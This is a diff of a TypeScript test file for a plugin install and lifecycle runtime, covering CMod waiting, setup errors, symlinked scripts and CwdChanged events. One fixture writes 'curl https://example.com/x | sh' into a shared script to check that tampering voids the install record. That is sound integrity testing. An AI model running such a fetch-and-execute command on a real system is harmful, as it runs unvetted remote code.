@@ -1,13 +1,13 @@
 import { expect, test } from 'bun:test'
-import type { Args, ClassicHookInputs, EventResult, Frozen, FsEntry, HookStream, Next, ProcessRunResult, ProcessSpawnChunk, ProcessSpawnRequest, ProcessSpawnResult, RenderElement } from 'claude-code'
+import type { Args, ClassicHookInputs, EventResult, Frozen, FsEntry, HookStream, ProcessRunResult, ProcessSpawnChunk, ProcessSpawnRequest, ProcessSpawnResult, RenderElement } from 'claude-code'
 import { defineMod, type Mod } from '../../src/mod.js'
 import type { RoutedEvent } from '../../src/runtime/hooks.js'
-import { createLifecycle, readPlugin, type Plugin } from '../../src/runtime/lifecycle.js'
+import { createLifecycle, readPlugin, type Lifecycle, type Plugin } from '../../src/runtime/lifecycle.js'
 import { scriptsSha256 } from '../../src/records.js'
+import { fakeClaude } from '../../src/testing/fake-claude.js'
+import { rowsOf, textOf } from '../../src/testing/fake-elements.js'
+import { fakeFiles } from '../../src/testing/fake-files.js'
 import { Text } from '../../src/ui/elements.js'
-import { fakeClaude } from '../../src/utils/fake-claude.js'
-import { rowsOf, textOf } from '../../src/utils/fake-elements.js'
-import { fakeFiles } from '../../src/utils/fake-files.js'
 
 const root = '/plugins/safe-delete'
 const pending: Plugin = { name: 'safe-delete', root, version: '0.2.0', store: '/home/.local/share/cmod', isInstalled: false, shouldRecord: false }
@@ -61,10 +61,6 @@ async function settle(): Promise<void> {
   for (let tick = 0; tick < 50; tick += 1) await Promise.resolve()
 }
 
-function nextAnswering<N extends RoutedEvent>(event: N, below: unknown): Next<N> {
-  return Object.assign(async () => below, { event }) as unknown as Next<N>
-}
-
 const postToolUse: ClassicHookInputs['PostToolUse'] = {
   session_id: 's',
   transcript_path: '/t',
@@ -76,8 +72,8 @@ const postToolUse: ClassicHookInputs['PostToolUse'] = {
   tool_use_id: 'toolu_1',
 }
 
-function fire<N extends RoutedEvent>(lifecycle: { route<M extends RoutedEvent>(event: M, e: Frozen<Args<M>>, next: Next<M>): Promise<EventResult<M>> }, event: N, input: unknown, below: unknown) {
-  return lifecycle.route(event, input as Frozen<Args<N>>, nextAnswering(event, below))
+function fire<N extends RoutedEvent>(lifecycle: Pick<Lifecycle<object>, 'route'>, event: N, input: unknown, below: unknown) {
+  return lifecycle.route(event, input as Frozen<Args<N>>, async () => below as EventResult<N>)
 }
 
 function trackedMod() {
@@ -296,7 +292,7 @@ test('a waiting mod continues its install once the cmod program appears, with no
   expect(runs).toEqual([])
 })
 
-test('a mod gives up waiting for CMod after 60 seconds and names it', async () => {
+test('a mod keeps waiting for CMod past 60 seconds and starts once CMod is ready', async () => {
   const fake = fakeClaude({ name: 'safe-delete', root })
   fake.fakes.process.run = cmodMissing
   const spawned: ProcessSpawnRequest[] = []
@@ -310,23 +306,29 @@ test('a mod gives up waiting for CMod after 60 seconds and names it', async () =
     timers.push(made)
     return { cancel: () => (made.isCancelled = true) }
   }
-  fake.claude.clock.every = timer
+  fake.fakes.clock.every = timer
   fake.fakes.clock.after = timer
-  const lifecycle = createLifecycle(trackedMod().definition)
+  const { runs, definition } = trackedMod()
+  const lifecycle = createLifecycle(definition)
 
   await lifecycle.start(fake.claude, given(pending))
   await settle()
   timers.find((made) => made.ms === 60_000)?.fire()
+  await settle()
+
+  expect(textOf(await fire(lifecycle, 'ui.render', abovePrompt, prompt))).toBe(">\n◌ Installing safe-delete  Still waiting for CMod to download cmod. See CMod's own line.")
+
   fake.fakes.process.run = cmodOnPath
   timers.find((made) => made.ms === 1000)?.fire()
   await settle()
+  await fire(lifecycle, 'classic.PostToolUse', postToolUse, {})
 
-  expect(textOf(await fire(lifecycle, 'ui.render', abovePrompt, prompt))).toBe('>\n✗ Installing safe-delete  CMod did not start in 60 seconds\n  Install it with cmod install cmod, then run /reload-plugins.')
-  expect(timers.find((made) => made.ms === 1000)?.isCancelled).toBe(true)
-  expect(spawned).toEqual([])
+  expect(spawned).toEqual([{ argv: ['cmod', 'setup', root, '--events'] }])
+  expect(timers.filter((made) => made.ms === 1000 || made.ms === 60_000).map((made) => made.isCancelled)).toEqual([true, true])
+  expect(runs).toEqual(['setup', 'PostToolUse'])
 })
 
-test('a setup that throws draws the error and leaves no hook registered', async () => {
+test('a mod whose setup function throws says its setup function threw, and leaves no hook registered', async () => {
   const fake = fakeClaude({ name: 'broken', root })
   let hookRuns = 0
   const lifecycle = createLifecycle(
@@ -346,7 +348,7 @@ test('a setup that throws draws the error and leaves no hook registered', async 
 
   expect(hookRuns).toBe(0)
   expect(textOf(await fire(lifecycle, 'ui.render', abovePrompt, prompt))).toBe(
-    '>\n✗ Installing broken  setup failed: no config file\n  Fix the mod’s setup, then run /reload-plugins.',
+    '>\n✗ Installing broken  its setup function threw: no config file\n  Fix it, then run /reload-plugins.',
   )
 })
 
@@ -421,6 +423,25 @@ test("the SDK lists files in a script's subfolders", async () => {
   expect((await readPlugin(fake.claude)).isInstalled).toBe(true)
 
   await fake.claude.fs.write(`${root}/setup/lib/brew.sh`, 'brew install trash-cli\n')
+
+  expect((await readPlugin(fake.claude)).isInstalled).toBe(false)
+})
+
+test('the SDK lists a symbolic link in a step folder', async () => {
+  const files: Record<string, string> = {
+    [`${root}/.claude-plugin/plugin.json`]: '{ "name": "safe-delete", "version": "0.2.0" }',
+    [`${root}/package.json`]: '{ "cmod": { "install": "./setup/install.sh" } }',
+    [`${root}/setup/install.sh`]: '. ./setup/brew.sh\n',
+    '/shared/brew.sh': 'brew install trash\n',
+  }
+  const fake = fakeClaude({ name: 'safe-delete', root })
+  Object.assign(fake.fakes.fs, fakeFiles(files, { [`${root}/setup/brew.sh`]: '/shared/brew.sh' }))
+  const sha = await scriptsSha256({ install: './setup/install.sh' }, { read: async (path) => fake.claude.fs.read(`${root}/${path}`), list: async () => ['brew.sh', 'install.sh'] })
+  await fake.claude.fs.write('/test/home/.local/share/cmod/records/safe-delete.json', JSON.stringify({ name: 'safe-delete', version: '0.2.0', root, installedAt: '2026-10-05T00:00:00.000Z', scriptsSha256: sha, uninstall: null, program: null }))
+
+  expect((await readPlugin(fake.claude)).isInstalled).toBe(true)
+
+  await fake.claude.fs.write('/shared/brew.sh', 'curl https://example.com/x | sh\n')
 
   expect((await readPlugin(fake.claude)).isInstalled).toBe(false)
 })
@@ -837,6 +858,17 @@ test('a Bash cd fires CwdChanged', async () => {
 
   await fire(lifecycle, 'classic.PostToolUse', { ...postToolUse, tool_name: 'Bash', tool_input: { command: 'cd lib' } }, {})
   await fire(lifecycle, 'classic.PostToolUse', { ...postToolUse, tool_name: 'Bash', tool_input: { command: 'ls' } }, {})
+
+  expect(moves).toEqual([movedTo('/work/a', '/work/a/lib')])
+})
+
+test('two overlapping Bash calls fire CwdChanged once', async () => {
+  const { lifecycle, session, moves, start } = folderPane()
+  await start()
+  session.cwd = '/work/a/lib'
+  const bash = (command: string) => fire(lifecycle, 'classic.PostToolUse', { ...postToolUse, tool_name: 'Bash', tool_input: { command } }, {})
+
+  await Promise.all([bash('cd lib'), bash('ls')])
 
   expect(moves).toEqual([movedTo('/work/a', '/work/a/lib')])
 })
